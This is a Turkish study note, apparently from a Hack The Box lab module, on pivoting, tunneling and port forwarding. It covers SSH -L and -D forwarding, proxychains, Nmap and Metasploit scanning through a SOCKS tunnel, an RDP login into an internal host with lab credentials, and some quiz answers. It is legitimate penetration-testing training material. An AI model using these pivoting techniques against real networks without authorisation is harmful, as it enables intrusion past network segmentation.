---
{"dg-publish":true,"permalink":"/active-directory/pivoting-tunneling-and-port-forwarding/"}
---



![Pasted image 20241003152420.png](/img/user/resimler/Pasted%20image%2020241003152420.png)
Bir kırmızı ekip çalışması, sızma testi veya Active Directory değerlendirmesi sırasında, kendimizi genellikle başka bir host'a geçmek için gerekli kimlik bilgilerini, ssh anahtarlarını, hash'leri veya access token'ları zaten ele geçirmiş olabileceğimiz bir durumda buluruz, ancak saldırı host'umuzdan doğrudan erişilebilecek başka bir host olmayabilir. Bu gibi durumlarda, bir sonraki hedefimize giden yolu bulmak için daha önce ele geçirdiğimiz bir pivot host kullanmamız gerekebilir. Bir host'a ilk kez girerken yapılması gereken en önemli şeylerden biri ayrıcalık seviyemizi, ağ bağlantılarımızı ve olası VPN veya diğer uzaktan erişim yazılımlarını kontrol etmektir. Bir hostun birden fazla network adaptörü varsa, muhtemelen bunu farklı bir network segmentine geçmek için kullanabiliriz. Pivotlama, esasen farklı ağ segmentlerinde daha fazla hedef bulmak için güvenliği ihlal edilmiş bir host üzerinden diğer ağlara geçme fikridir.

Daha önce ulaşılamayan bir ağ segmentine pivot (dönemk) için kullanabileceğimiz güvenliği ihlal edilmiş bir hostu tanımlamak için kullanılan birçok farklı terim vardır. En yaygın olanlardan bazıları şunlardır:
- `Pivot Host`
- `Proxy`
- `Foothold`
- `Beach Head system`
- `Jump Host`

Pivotlamanın birincil kullanımı, yalıtımlı bir ağa erişmek için segmentasyonu (hem fiziksel hem de virtuel olarak) aşmaktır. Tünelleme ise pivotlamanın bir alt kümesidir. Tünelleme, ağ trafiğini başka bir protokole kapsüller ve trafiği bu protokol üzerinden yönlendirir. Şöyle düşünün:

Bir ortağımıza göndermemiz gereken bir paket anahtarımız var, ancak paketimizi gören hiç kimsenin bunun bir paket anahtar olduğunu bilmesini istemiyoruz. Bu yüzden doldurulmuş bir oyuncak hayvan alıyoruz ve anahtarı ne işe yaradığına dair talimatlarla birlikte içine saklıyoruz. Daha sonra oyuncağı paketleyip ortağımıza gönderiyoruz. Kutuyu inceleyen herkes basit bir pelüş oyuncak görecek, içinde başka bir şey olduğunu fark etmeyecektir. Sadece ortağımız anahtarın içinde saklı olduğunu bilecek ve teslim edildikten sonra ona nasıl erişeceğini ve kullanacağını öğrenecektir.

VPN'ler veya gelişmiş tarayıcılar gibi tipik uygulamalar ağ trafiğini tünellemenin başka bir şeklidir.

IT ve Infosec endüstrisinde aynı şeyi tanımlamak için kullanılan birkaç farklı terimle kaçınılmaz olarak karşılaşacağız. Pivotlama söz konusu olduğunda, bunun genellikle Lateral Movement (Yanal Hareket) olarak adlandırıldığını fark edeceğiz.

Pivotlama ile aynı şey değil mi?

Bunun cevabı tam olarak değil. Lateral Movement'ı Pivoting ve Tunneling ile karşılaştırmak için biraz zaman ayıralım, çünkü bazılarının bunları neden farklı kavramlar olarak gördüğü konusunda bazı karışıklıklar olabilir.



### Lateral Movement, Pivoting, and Tunneling Karşılaştırma

### Lateral Movement
Lateral movement, bir ağ ortamındaki ek hostlara, uygulamalara ve services'e erişimimizi ilerletmek için kullanılan bir teknik olarak tanımlanabilir. Lateral movement, ayrıcalıklarımızı yükseltmek için ihtiyaç duyabileceğimiz belirli domain kaynaklarına erişim kazanmamıza da yardımcı olabilir. Lateral Movement genellikle hostlar arasında ayrıcalık yükseltme sağlar. Bu kavram için sağladığımız açıklamaya ek olarak, diğer saygın kuruluşların Lateral Movement'ı nasıl açıkladığını da inceleyebiliriz. Zamanınız olduğunda bu iki açıklamaya göz atın:

https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement
https://attack.mitre.org/tactics/TA0008/

Lateral Movement'ın pratik bir örneği şöyle olabilir:

Bir değerlendirme sırasında hedef ortama ilk erişimi sağladık ve lokal yönetici hesabının kontrolünü ele geçirmeyi başardık. Bir ağ taraması gerçekleştirdik ve ağda üç Windows host daha bulduk. Aynı local administrator kimlik bilgilerini kullanmayı denedik ve bu cihazlardan biri aynı administrator hesabını paylaşıyordu. Kimlik bilgilerini kullanarak diğer cihaza lateral olarak geçtik ve domain'i daha fazla tehlikeye atmamızı sağladık.


### Pivoting
Normalde erişemeyeceğiniz ağ sınırlarını aşmak için birden fazla host kullanmak. Bu daha çok hedefe yönelik bir amaçtır. Buradaki amaç, hedeflenen hostları veya altyapıyı tehlikeye atarak bir ağın derinliklerine inmemizi sağlamaktır.

Pivoting'in pratik bir örneği şöyle olabilir:

Zorlu bir angajman sırasında, hedefin ağı fiziksel ve mantıksal olarak ayrılmıştı. Bu ayrılık hareket etmemizi ve hedeflerimizi tamamlamamızı zorlaştırdı. Ağı araştırmak ve operasyonel ortamdaki ekipmanın bakımını yapmak ve izlemek, raporlar göndermek ve kurumsal ortamdaki diğer idari görevleri yerine getirmek için kullanılan mühendislik workstation'ı olduğu ortaya çıkan bir host'u tehlikeye atmak zorunda kaldık. Bu hostun dual-homed (farklı ağlara bağlı birden fazla fiziksel NIC'ye sahip) olduğu ortaya çıktı. Hem kurumsal hem de operasyonel ağlara erişimi olmasaydı, değerlendirmemizi tamamlamak için ihtiyaç duyduğumuz şekilde dönmemiz mümkün olmazdı.

Özetle, bu bilgisayarın hem kurumsal hem de operasyonel ağa bağlı olması, sızma testi ekibinin ağın tamamına erişim sağlayabilmesini ve hedeflerine ulaşmasını mümkün kıldı.


### Tunneling
Trafiğimizin tespit edilme olasılığı olan bir ağa trafik aktarmak için sıklıkla kendimizi çeşitli protokoller kullanırken buluruz. Örneğin, sahip olduğumuz bir sunucudan kurban host'a giden Command & Control trafiğimizi maskelemek için HTTP kullanmak gibi. Buradaki kilit nokta, tespit edilmekten mümkün olduğunca uzun süre kaçınmak için eylemlerimizi gizlemektir. TLS üzerinden HTTPS veya diğer taşıma protokolleri üzerinden SSH gibi gelişmiş güvenlik önlemlerine sahip protokoller kullanıyoruz. Bu tür eylemler, verilerin hedef ağdan dışarı sızması ya da ağa daha fazla payload ve talimat gönderilmesi gibi taktikleri de mümkün kılar.

Tünellemenin pratik bir örneği şöyle olabilir:

Özetlemek gerekirse, bu taktiklere ayrı şeyler olarak bakmalıyız. Lateral Movement bir ağ içinde geniş bir alana yayılmamıza ve ayrıcalıklarımızı artırmamıza yardımcı olurken, Pivoting daha önce ulaşılamayan ortamlara erişerek ağların daha derinlerine inmemizi sağlar.


### Pivotlamanın Arkasındaki Networking
Bir görevde başarılı olmak için pivotlama kavramını yeterince iyi kavrayabilmek, bazı temel ağ kavramlarının sağlam bir şekilde anlaşılmasını gerektirir. Bu bölüm, pivotlamayı anlamak için gerekli temel ağ kavramları hakkında hızlı bir tazeleme olacaktır.

### IP Adresleme ve NIC'ler
Bir ağ üzerinde iletişim kuran her bilgisayarın bir IP adresine ihtiyacı vardır. Eğer bir IP adresi yoksa, bir ağ üzerinde değildir. IP adresi yazılımda atanır ve genellikle bir DHCP sunucusundan otomatik olarak alınır. Statik olarak atanmış IP adreslerine sahip bilgisayarları görmek de yaygındır. Statik IP ataması şu durumlarda yaygındır:

- Servers
- Routers
- Switch virtual interfaces
- Printers
- Ve ağa kritik servisler sağlayan tüm cihazlar

İster dinamik ister statik olarak atanmış olsun, IP adresi bir Network Interface Controller'a (NIC) atanır. Genellikle NIC, Network Interface Card (Ağ Arayüz Kartı) veya Network Adapter (Ağ Adaptörü) olarak adlandırılır. Bir bilgisayar birden fazla NIC'ye (fiziksel ve sanal) sahip olabilir, yani çeşitli ağlarda iletişim kurmasına olanak tanıyan birden fazla IP adresi atanabilir. Pivotlama fırsatlarının belirlenmesi genellikle tehlikeye attığımız hostlara atanan belirli IP'lere bağlı olacaktır çünkü bunlar tehlikeye atılan hostların ulaşabileceği ağları gösterebilir. Bu nedenle ifconfig (macOS ve Linux'ta) ve ipconfig (Windows'ta) gibi komutları kullanarak her zaman ek NIC'leri kontrol etmemiz önemlidir.

#### Using ifconfig
![Pasted image 20241003155921.png](/img/user/resimler/Pasted%20image%2020241003155921.png)

Yukarıdaki çıktıda, her NIC'nin bir tanımlayıcısı (eth0, eth1, lo, tun0) ve ardından adresleme bilgileri ve trafik istatistikleri vardır. Tunel arayüzü (tun0) bir VPN bağlantısının aktif olduğunu gösterir. HTB'nin VPN sunucularından herhangi birine Pwnbox veya kendi saldırı hostumuz aracılığıyla bağlandığımızda, her zaman bir tünel arayüzünün oluşturulduğunu ve bir IP adresi atandığını fark edeceğiz. VPN, HTB tarafından barındırılan laboratuvar ağ ortamlarına erişmemizi sağlar. Bu laboratuvar ağlarına bir tünel kurulmadan erişilemeyeceğini unutmayın. VPN trafiği şifreler ve ayrıca genel bir ağ (genellikle İnternet) üzerinden, genel ağa bakan bir ağ cihazındaki NAT üzerinden ve iç/özel ağa bir tünel kurar. Ayrıca, her bir NIC'ye atanan IP adreslerine dikkat edin. eth0'a atanan IP (134.122.100.200) genel olarak yönlendirilebilir bir IP adresidir. Yani ISP'ler bu IP'den kaynaklanan trafiği İnternet üzerinden yönlendirecektir. Public IP'leri, genellikle DMZ'lerde barındırılan, doğrudan İnternet'e bakan cihazlarda göreceğiz. Diğer NIC'lerin özel IP adresleri vardır, bunlar iç ağlarda yönlendirilebilir ancak genel İnternet üzerinden yönlendirilemez. Bu yazının yazıldığı sırada, İnternet üzerinden iletişim kurmak isteyen herkes, İnternet'e bağlanan fiziksel altyapıya bağlanan ağ cihazındaki bir arayüze atanmış en az bir genel IP adresine sahip olmalıdır. NAT'ın genellikle private IP adreslerini public IP adreslerine çevirmek için kullanıldığını hatırlayın.


#### Using ipconfig
![Pasted image 20241003160248.png](/img/user/resimler/Pasted%20image%2020241003160248.png)
Yukarıdaki çıktı bir Windows sisteminde ipconfig komutunun çalıştırılmasıyla elde edilmiştir. Bu sistemin birden fazla adaptörü olduğunu, ancak bunlardan yalnızca birine IP adresi atandığını görebiliriz. [IPv6](https://www.cisco.com/c/en/us/solutions/ipv6/overview.html) adresleri ve bir [IPv4](https://en.wikipedia.org/wiki/IPv4) adresi vardır. Bu modül, kurumsal LAN'larda en yaygın IP adresleme mekanizması olmaya devam ettiği için öncelikle IPv4 çalıştıran ağlara odaklanacaktır. Yukarıdaki çıktıda olduğu gibi bazı adaptörlerde, kaynaklara IPv4 veya IPv6 üzerinden ulaşılmasını sağlayan [dual-stack](https://www.cisco.com/c/dam/en_us/solutions/industries/docs/gov/IPV6at_a_glance_c45-625859.pdf) yapılandırmasında atanmış bir IPv4 ve bir IPv6 adresi olduğunu fark edeceğiz.


#### Routing
Router deyince aklımıza genellikle bizi internete bağlayan bir ağ cihazı gelir, ancak teknik olarak herhangi bir bilgisayar router olabilir ve yönlendirmeye katılabilir. Bu modülde karşılaşacağımız bazı zorluklar, bir pivot host'un trafiği başka bir network'e yönlendirmesini gerektirmektedir. Bunu görmemizin bir yolu, saldırı kutumuzun bir pivot host aracılığıyla erişilebilen hedef ağlara rotalara sahip olmasını sağlayan AutoRoute'u kullanmaktır. Bir router'ın temel tanımlayıcı özelliklerinden biri, hedef IP adresine dayalı olarak trafiği iletmek için kullandığı bir routing tablosuna sahip olmasıdır. Şimdi ==netstat -r== veya ==ip route== komutlarını kullanarak Pwnbox'ta buna bakalım.



#### Routing Table
![Pasted image 20241003165516.png](/img/user/resimler/Pasted%20image%2020241003165516.png)
Pwnbox, Linux dağıtımları, Windows ve diğer birçok işletim sisteminin routing kararları vermede sisteme yardımcı olmak için bir routing tablosuna sahip olduğunu fark edeceğiz. Bir paket oluşturulduğunda ve bilgisayardan ayrılmadan önce bir hedefi olduğunda, nereye gönderileceğine karar vermek için routing tablosu kullanılır. Örneğin, 10.129.10.25 IP adresli bir hedefe bağlanmaya çalışıyorsak, routing tablosundan paketin oraya ulaşmak için nereye gönderileceğini söyleyebiliriz. İlgili NIC'den (Iface) bir Gateway'e yönlendirilecektir. Pwnbox bu rotaların her birini öğrenmek için herhangi bir yönlendirme protokolü (EIGRP, OSPF, BGP, vb...) kullanmıyor. Bu rotaları kendi doğrudan bağlı arayüzleri (eth0, eth1, tun0) aracılığıyla öğrenmiştir. Router olarak belirlenen bağımsız cihazlar tipik olarak statik rota oluşturma, dinamik yönlendirme protokolleri ve doğrudan bağlı arayüzlerin bir kombinasyonunu kullanarak rotaları öğrenecektir. Routing tablosunda bulunmayan ağlara yönelik herhangi bir trafik, default gateway veya gateway of last resort olarak da adlandırılabilen varsayılan rotaya gönderilecektir. Pivot fırsatları ararken, hangi ağlara ulaşabileceğimizi veya hangi rotaları eklememiz gerekebileceğini belirlemek için hostların routing tablosuna bakmak faydalı olabilir.


## Protocols, Services & Ports
Protokoller ağ iletişimini yöneten kurallardır. Birçok protokol ve servis, tanımlayıcı olarak işlev gören ilgili portlara sahiptir. Logical portlar dokunabileceğimiz ya da herhangi bir şeyi takabileceğimiz fiziksel şeyler değildir. Uygulamalara atanan yazılımlarda bulunurlar. Bir IP adresi gördüğümüzde, bunun bir ağ üzerinden erişilebilen bir bilgisayarı tanımladığını biliriz. Bu IP adresine bağlı açık bir port gördüğümüzde, bunun bağlanabileceğimiz bir uygulamayı tanımladığını biliriz. Bir cihazın dinlediği belirli portlara bağlanmak, genellikle ağ üzerinde bir yer edinmek için güvenlik duvarında izin verilen portları ve protokolleri kullanmamıza izin verebilir.

Örneğin HTTP kullanan bir web sunucusunu ele alalım (genellikle 80 numaralı portu dinler). Yöneticiler 80 numaralı porttan gelen trafiği engellememelidir. Bu, herhangi birinin barındırdıkları web sitesini ziyaret etmesini engelleyecektir. Bu genellikle meşru trafiğin geçtiği aynı port üzerinden ağ ortamına girmenin bir yoludur. Bir bağlantının client tarafında kurulan bağlantıları takip etmek için bir kaynak portunun da oluşturulduğu gerçeğini göz ardı etmemeliyiz. Payload'larımızı çalıştırdığımızda, kurduğumuz amaçlanan listener'lara geri bağlandıklarından emin olmak için hangi portları kullandığımıza dikkat etmemiz gerekir. 

LTNB0B'den bir ipucu: Bu modülde, farklı ağlara bağlı hedeflere erişmek için hostlar arasında gezinmek ve lokal veya remote servisleri saldırı hostumuza yönlendirmek için birçok farklı araç ve teknik uygulayacağız. Bu modül, öğrenilenleri uygulamak için çoklu host ağları sağlayarak zorluk derecesini kademeli olarak artırmaktadır. Kavramları anlamaya başladığınızda birçok farklı yöntemi yaratıcı yollarla uygulamanızı şiddetle tavsiye ediyorum. Hatta zorluklarla karşılaştıkça ağ diyagramı araçlarını kullanarak ağ topolojilerini çizmeye çalışın. Pivot yapmak için fırsatlar aradığımda, içinde bulunduğum ağ ortamının bir görselini oluşturmak için [Draw.io](https://app.diagrams.net/) gibi araçları kullanmayı seviyorum, aynı zamanda harika bir dokümantasyon aracı olarak da hizmet ediyor.

Soru :  Aşağıdaki Routing Tablosunda bir paket 10.129.10.25 IP adresine sahip bir host'a yönlendirilirse, paket hangi NIC'den iletilecektir?
![Pasted image 20241003182621.png](/img/user/resimler/Pasted%20image%2020241003182621.png)
Cevap :  tun0 

Soru : Okuma bölümündeki ifconfig çıktısını kullanma kısmına başvurun. Hangi NIC'ye bir public IP adresi atanmıştır?

![Pasted image 20241003155921.png](/img/user/resimler/Pasted%20image%2020241003155921.png)
Cevap : eth0

Soru : Okuma bölümünde gösterilen Pwnbox çıktısındaki Routing Tablosunu referans alın. Eğer bir paket www.hackthebox.com adresine gönderilecekse, gönderileceği ağ geçidinin IP adresi nedir?

Cevap : 178.62.64.1

"Verilen routing tablosuna göre, [www.hackthebox.com](http://www.hackthebox.com) adresine bir paket gönderilecekse, bu adres genellikle dış bir ağda (internette) bulunur. Bu nedenle, **default** gateway (varsayılan ağ geçidi) kullanılır.

Tabloya bakıldığında, **default** gateway'in IP adresi **178.62.64.1** olarak gösteriliyor.

Bu nedenle, [www.hackthebox.com](http://www.hackthebox.com) adresine bir paket gönderilecekse, paket **178.62.64.1** ağ geçidine gönderilecektir."


## SSH ve SOCKS Tünelleme ile Dinamik Port Yönlendirme

### Port Forwarding in Context
Port yönlendirme, bir iletişim talebini bir porttan diğerine yönlendirmemizi sağlayan bir tekniktir. Port yönlendirme, yönlendirilen port için etkileşimli iletişim sağlamak üzere primer iletişim katmanı olarak TCP'yi kullanır. Bununla birlikte, yönlendirilen trafiği kapsüllemek için SSH veya hatta [SOCKS](https://en.wikipedia.org/wiki/SOCKS)(uygulama katmanı olmayan) gibi farklı uygulama katmanı protokolleri kullanılabilir. Bu, güvenlik duvarlarını atlamak ve tehlikeye atılan hosttaki mevcut servisleri kullanarak diğer ağlara geçiş yapmak için etkili olabilir.

**Güvenlik Duvarlarını Aşmak:**

- Güvenlik duvarları, belirli portları ve trafiği engelleyebilir. Ancak port yönlendirme ile bu engellerin aşılması mümkündür. Örneğin, bir sistemin dışarıdan erişime kapalı olduğu ancak başka bir portunun açık olduğu durumlarda, port yönlendirme ile kapalı porta erişim sağlanabilir.

**Ağlara Geçiş Yapmak (Pivoting):**

- Sızma testi sırasında, saldırganlar genellikle bir sistemi ele geçirip diğer sistemlere veya ağlara geçiş yapmak için port yönlendirme kullanırlar. Bu, ele geçirilen bir hostun (örneğin bir sunucunun) diğer ağlara erişim sağlamak için kullanılması anlamına gelir.

**SOCKS Proxy**, genel bir proxy protokolü olup, trafiği şifrelemez ve **TCP/UDP trafiğini** bir proxy sunucusu üzerinden yönlendirir. **Transport Layer** (Taşıma Katmanı) üzerinde çalışır ve uygulama katmanına özgü değildir. **SSH** ise güvenli bir protokoldür, veri trafiğini uçtan uca şifreleyerek güvenli uzaktan erişim ve tünelleme sağlar. SSH, **Application Layer** (Uygulama Katmanı) üzerinde çalışır, ancak tünelleme sırasında alt katmanlardaki trafiği de şifreleyebilir. SOCKS proxy, uygulama bağımsız olarak geniş bir trafik türünü yönlendirirken, SSH esas olarak güvenli uzaktan erişim için kullanılır ve veri gizliliğini garanti eder. **SSH tünelleme**, **SOCKS proxy'den** daha güvenli bir yönlendirme sağlar çünkü tüm trafik şifrelenmiş bir kanal üzerinden geçer.


## SSH Local Port Forwarding
Aşağıdaki resimden bir örnek alalım.
![Pasted image 20241003183858.png](/img/user/resimler/Pasted%20image%2020241003183858.png)
1-SSH, 1234 numaralı local port üzerindeki trafiği dinlemek üzere yapılandırılmıştır      
2-Local port 1234'ün remote port 3306'ya forward edilmesini talep eder
3-Forwards 3306 traffic back over port 22

Saldırı hostumuz (10.10.15.x) ve ele geçirdiğimiz bir hedef Ubuntu sunucumuz (10.129.x.x) var. Açık portları aramak için Nmap kullanarak hedef Ubuntu sunucusunu tarayacağız.

#### Scanning the Pivot Target
![Pasted image 20241003184428.png](/img/user/resimler/Pasted%20image%2020241003184428.png)

* ssh open  mysql close 

Nmap çıktısı SSH portunun açık olduğunu göstermektedir. MySQL servisine erişmek için ya SSH ile sunucuya girip Ubuntu sunucusunun içinden MySQL'e erişebiliriz ya da 1234 numaralı porttan localhost'umuza yönlendirip lokal olarak erişebiliriz. Lokal olarak erişmenin bir avantajı, MySQL servisinde remote bir exploit çalıştırmak istersek, port yönlendirme olmadan bunu yapamayız. Bunun nedeni MySQL'in Ubuntu sunucusunda 3306 numaralı portta lokal olarak barındırılmasıdır. Bu yüzden, lokal portumuzu (1234) SSH üzerinden Ubuntu sunucusuna yönlendirmek için aşağıdaki komutu kullanacağız.


#### Executing the Local Port Forward
![Pasted image 20241003184635.png](/img/user/resimler/Pasted%20image%2020241003184635.png)

-L komutu SSH client'a SSH server'dan 1234 portu üzerinden gönderdiğimiz tüm verileri Ubuntu server üzerindeki ==localhost:3306=='ya iletmesini istemesini söyler. Bunu yaparak, 1234 numaralı Port üzerinden MySQL servisine local olarak erişebilmeliyiz. MySQL servisinin yönlendirilip yönlendirilmediğini doğrulamak için Netstat veya Nmap kullanarak yerel hostumuzu 1234 portu üzerinden sorgulayabiliriz.


### Netstat ile Port Yönlendirmeyi Doğrulama
![Pasted image 20241003184836.png](/img/user/resimler/Pasted%20image%2020241003184836.png)


#### Confirming Port Forward with Nmap
![Pasted image 20241003185007.png](/img/user/resimler/Pasted%20image%2020241003185007.png)
Benzer şekilde, Ubuntu sunucusundan localhost'unuza birden fazla port yönlendirmek istiyorsak, bunu ssh komutunuza ==local port:server:port== argümanını ekleyerek yapabilirsiniz. Örneğin, aşağıdaki komut apache web sunucusunun 80 numaralı portunu saldırı hostunuzun 8080 numaralı yerel portuna yönlendirir.


### Birden Fazla Portu Yönlendirme
![Pasted image 20241003185319.png](/img/user/resimler/Pasted%20image%2020241003185319.png)

### Pivot için Ayarlama
Şimdi, Ubuntu hostuna ifconfig yazarsanız, bu sunucunun birden fazla NIC'ye sahip olduğunu göreceksiniz:
* Biri saldırı hostumuza bağlı (ens192)
* Farklı bir ağ içindeki diğer hostlarla iletişim kuran biri (ens224)
* Loopback interface (lo).


### ifconfig kullanarak Pivot Yapmak için Fırsatlar Arıyoruz
![Pasted image 20241003185511.png](/img/user/resimler/Pasted%20image%2020241003185511.png)
Hangi porta erişeceğimizi bildiğimiz önceki senaryonun aksine, mevcut senaryomuzda ağın diğer tarafında hangi servislerin bulunduğunu bilmiyoruz. Bu nedenle, ağdaki daha küçük IP aralıklarını (==172.16.5.1-200==) ağını veya tüm subnet'i (==172.16.5.0/23==) tarayabiliriz. Bu taramayı doğrudan saldırı hostumuzdan gerçekleştiremeyiz çünkü 172.16.5.0/23 ağına giden rotaları yoktur. Bunu yapmak için dinamik port yönlendirme yapmamız ve ağ paketlerimizi Ubuntu sunucusu üzerinden yönlendirmemiz gerekecek. Bunu, lokal hostumuzda (kişisel saldırı hostu) bir SOCKS listener başlatarak ve ardından hedef host'a bağlandıktan sonra SSH üzerinden bu trafiği ağa (172.16.5.0/23) yönlendirmek için SSH'yi yapılandırarak yapabiliriz.

Buna SOCKS proxy üzerinden SSH tünelleme denir. SOCKS, güvenlik duvarı kısıtlamalarınızın olduğu sunucularla iletişim kurmanıza yardımcı olan bir protokol olan Socket Secure'un kısaltmasıdır. Bir servise bağlanmak için bir bağlantı başlattığınız çoğu durumun aksine, SOCKS durumunda, ilk trafik, client tarafındaki bir servise erişmek isteyen kullanıcı tarafından kontrol edilen SOCKS sunucusuna bağlanan bir SOCKS client tarafından oluşturulur. Bağlantı kurulduktan sonra, ağ trafiği bağlı client adına SOCKS sunucusu üzerinden yönlendirilebilir.

Bu teknik genellikle güvenlik duvarları tarafından konulan kısıtlamaları aşmak ve dış bir varlığın güvenlik duvarını atlamasına ve güvenlik duvarlı ortamdaki bir hizmete erişmesine izin vermek için kullanılır. Verileri döndürmek ve iletmek için SOCKS proxy kullanmanın bir diğer faydası da SOCKS proxy'lerin NAT ağlarından dış bir sunucuya rota oluşturarak dönebilmesidir. SOCKS proxy'leri şu anda iki tiptir: SOCKS4 ve SOCKS5. SOCKS4 herhangi bir kimlik doğrulama ve UDP desteği sağlamazken, SOCKS5 bunları sağlar. Doğrudan erişemediğimiz 172.16.5.0/23 NAT'lı bir ağa sahip olduğumuz aşağıdaki görüntüyü örnek alalım.
![Pasted image 20241003185946.png](/img/user/resimler/Pasted%20image%2020241003185946.png)
Yukarıdaki görüntüde, saldırı hostu SSH client'ı başlatır ve SSH server'dan ssh soketi üzerinden bazı TCP verileri göndermesine izin vermesini ister. SSH sunucusu bir onay ile yanıt verir ve SSH client'ini daha sonra localhost:9050'yi dinlemeye başlar. Buraya gönderdiğiniz veriler SSH üzerinden tüm ağa (172.16.5.0/23) yayınlanacaktır. Bu dinamik port yönlendirmesini gerçekleştirmek için aşağıdaki komutu kullanabiliriz.


### SSH ile Dinamik Port Yönlendirmeyi Etkinleştirme
![Pasted image 20241003190103.png](/img/user/resimler/Pasted%20image%2020241003190103.png)
-D argümanı SSH sunucusundan dinamik port yönlendirmeyi etkinleştirmesini ister. Bunu etkinleştirdikten sonra, herhangi bir aracın paketlerini 9050 numaralı port üzerinden yönlendirebilecek bir araca ihtiyacımız olacak. Bunu, TCP bağlantılarını TOR, SOCKS ve HTTP/HTTPS proxy sunucuları üzerinden yönlendirebilen ve ayrıca birden fazla proxy sunucusunu birbirine zincirlememize olanak tanıyan proxychains aracını kullanarak yapabiliriz. Proxychains kullanarak, talep eden hostun IP adresini de gizleyebiliriz, çünkü alıcı host yalnızca pivot hostun IP'sini görecektir. Proxy zincirleri genellikle bir uygulamanın TCP trafiğini SOCKS4/SOCKS5, TOR veya HTTP/HTTPS proxy'leri gibi barındırılan proxy'ler üzerinden geçmeye zorlamak için kullanılır.

Proxychains'e 9050 portunu kullanmamız gerektiğini bildirmek için ==/etc/proxychains.conf== adresinde bulunan proxychains yapılandırma dosyasını değiştirmeliyiz. Zaten orada değilse, son satıra ==socks4 127.0.0.1 9050== ekleyebiliriz.


#### Checking /etc/proxychains.conf
![Pasted image 20241003190250.png](/img/user/resimler/Pasted%20image%2020241003190250.png)
Şimdi aşağıdaki komutu kullanarak Nmap'i proxychains ile başlattığınızda, Nmap'in tüm paketlerini SSH clientimizden dinlediği lokal port 9050'ye yönlendirecek ve bu da tüm paketleri SSH üzerinden 172.16.5.0/23 ağına iletecektir.


### Nmap'i Proxy Zincirleri ile Kullanma
![Pasted image 20241003190403.png](/img/user/resimler/Pasted%20image%2020241003190403.png)

Tüm Nmap verilerinizi proxychains kullanarak paketlemenin ve remote bir sunucuya yönlendirmenin bu kısmına SOCKS tünelleme denir. Burada hatırlanması gereken bir diğer önemli not ise proxy zincirleri üzerinden sadece tam TCP bağlantı taraması yapabileceğimizdir. Bunun sebebi proxychain'lerin kısmi paketleri anlayamamasıdır. Yarım bağlantı taramaları gibi kısmi paketler gönderirseniz, yanlış sonuçlar döndürecektir. Ayrıca Windows Defender güvenlik duvarı varsayılan olarak ICMP isteklerini (geleneksel pingler) engellediği için host-alive kontrollerinin Windows hedeflerine karşı çalışmayabileceğinin farkında olduğumuzdan emin olmamız gerekir.

[Tüm bir ağ aralığında ping olmadan](https://nmap.org/book/scan-methods-connect-scan.html) tam bir TCP connect taraması uzun zaman alacaktır. Bu nedenle, bu modül için öncelikle tek tek hostları veya canlı olduğunu bildiğimiz daha küçük host aralıklarını taramaya odaklanacağız, bu durumda bu 172.16.5.19 adresindeki bir Windows hostu olacaktır.

Aşağıdaki komutu kullanarak remote sistem taraması gerçekleştireceğiz.


### Windows Hedefinin Proxy Zincirleri Aracılığıyla Numaralandırılması
![Pasted image 20241003190708.png](/img/user/resimler/Pasted%20image%2020241003190708.png)

Nmap taraması, biri RDP portu (3389) olmak üzere birkaç açık port gösterir. Nmap taramasına benzer şekilde, Metasploit yardımcı modüllerini kullanarak savunmasız RDP taramaları gerçekleştirmek için proxychains aracılığıyla msfconsole'u da pivot edebiliriz. Msfconsole'u proxychains ile başlatabiliriz.


### Metasploit'i Proxychains ile Kullanma
Metasploit'i proxychains kullanarak da açabilir ve ilgili tüm trafiği kurduğumuz proxy üzerinden gönderebiliriz.
![Pasted image 20241003191109.png](/img/user/resimler/Pasted%20image%2020241003191109.png)
İç ağdaki hostun 3389'u dinleyip dinlemediğini kontrol etmek için rdp_scanner yardımcı modülünü kullanalım.



### rdp_scanner Modülünün Kullanımı
![Pasted image 20241003191432.png](/img/user/resimler/Pasted%20image%2020241003191432.png)
Yukarıdaki çıktının alt kısmında, Windows işletim sistemi sürümü ile açık olan RDP portu görülebilir.

Bir değerlendirme sırasında bu host'a sahip olduğumuz erişim seviyesine bağlı olarak, bir exploit çalıştırmayı veya toplanan kimlik bilgilerini kullanarak oturum açmayı deneyebiliriz. Bu konu dahili için, SOCKS tüneli üzerinden Windows Remote Host'ta oturum açacağız. Bu xfreerdp kullanılarak yapılabilir. Bizim durumumuzdaki kullanıcı victor ve şifre pass@123


### Proxy zincirleri ile xfreerdp kullanımı
![Pasted image 20241003191531.png](/img/user/resimler/Pasted%20image%2020241003191531.png)
xfreerdp komutu, oturumu başarıyla kurmadan önce bir RDP sertifikasının kabul edilmesini gerektirecektir. Kabul ettikten sonra, Ubuntu sunucusu üzerinden dönen bir RDP oturumuna sahip olmalıyız.


### Başarılı RDP Pivotu
![Pasted image 20241003191556.png](/img/user/resimler/Pasted%20image%2020241003191556.png)


### Bölüm Özet : 

```shell-session
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

```shell-session
netstat -antp | grep 1234
```

```shell-session
nmap -v -sV -p1234 localhost
```

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

```shell-session
 ssh -D 9050 ubuntu@10.129.202.64
```

```shell-session
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

```shell-session
$ proxychains nmap -v -sn 172.16.5.1-20
```

```shell-session
$ proxychains nmap -v -Pn -sT 172.16.5.19
```

```shell-session
$ proxychains msfconsole
```

```shell-session
msf6 > search rdp_scanner
```

```shell-session
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

- `ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`: Yerel port 1234'ü uzak sunucudaki localhost:3306'ya (MySQL portu) SSH tünellemesi yaparak yönlendirir.
    
- `netstat -antp | grep 1234`: Yerel makinedeki 1234 numaralı portta çalışan TCP bağlantısını gösterir.
    
- `nmap -v -sV -p1234 localhost`: Yerel makinedeki 1234 portunda çalışan servisin versiyon bilgilerini tarar.
    
- `ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64`: SSH ile iki ayrı portu (1234 -> MySQL, 8080 -> HTTP) aynı anda yönlendirir.
    
- `ssh -D 9050 ubuntu@10.129.202.64`: SSH üzerinden SOCKS proxy (port 9050) oluşturur.
    
- `tail -4 /etc/proxychains.conf`: Proxychains konfigürasyon dosyasının son dört satırını gösterir (SOCKS4 proxy ayarı port 9050'de).
    
- `proxychains nmap -v -sn 172.16.5.1-20`: Proxychains üzerinden, belirttiğiniz IP aralığında Nmap ile host keşif (ping taraması) yapar.
    
